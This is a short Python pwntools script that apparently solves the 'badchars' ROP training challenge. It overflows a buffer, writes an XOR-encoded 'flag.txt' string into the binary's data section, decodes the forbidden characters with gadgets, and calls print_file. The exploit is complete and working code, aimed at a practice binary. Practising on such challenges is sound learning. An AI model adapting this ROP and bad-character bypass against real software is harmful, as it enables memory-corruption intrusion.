#! /usr/bin/env python2
from pwn import *
import string

gadget1 = 0x040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

gadget2 = 0x0400634 # mov qword ptr [r13], r12 ; ret

gadget3 = 0x04006A3 # pop rdi ; ret

gadget4 = 0x0400628 # xor byte ptr [r15], r14b ; ret

gadget5 = 0x04006a0 # pop r14 ; pop r15 ; ret

dataSect = 0x0601028 + 0x8 # data section + 8

print_file_plt = 0x400510

payload = 'A'*40

# a, g, x, .
badchars = ['a', 'g', 'x', '.']
# used to find xor pair for bad character
'''for k in range(len(badchars)):
	print(badchars[k] + ':')
	for x in string.printable:
	    for y in range(16):
		    if chr(ord(x) ^ y) == badchars[k]:
			        print(x + ' ' + str(y))
'''
# 'b' ^ 3 = 'a'
# 'c' ^ 4 = 'g'
# 'y' ^ 1 = 'x'
# '+' ^ 5 = '.'
r15 = b'flbc+tyt'
# write xor string to data section then xor the byte to obtain right string
payload += p64(gadget1) + r15 + p64(dataSect) + p64(0x3) + p64(dataSect+2) + p64(gadget2) + p64(gadget4)
# 'c' ^ 4 = 'g'
payload += p64(gadget5) + p64(0x4) + p64(dataSect+3) + p64(gadget4)
# '+' ^ 5 = '.'
payload += p64(gadget5) + p64(0x5) + p64(dataSect+4) + p64(gadget4)
# 'y' ^ 1 = 'x'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+6) + p64(gadget4)
# pop rdi
payload += p64(gadget3) + p64(dataSect)
# print_file
payload += p64(print_file_plt)

#print(payload)

elf = ELF('./badchars')

proc = elf.process()

proc.recvuntil('> ')

proc.sendline(payload)

proc.interactive()
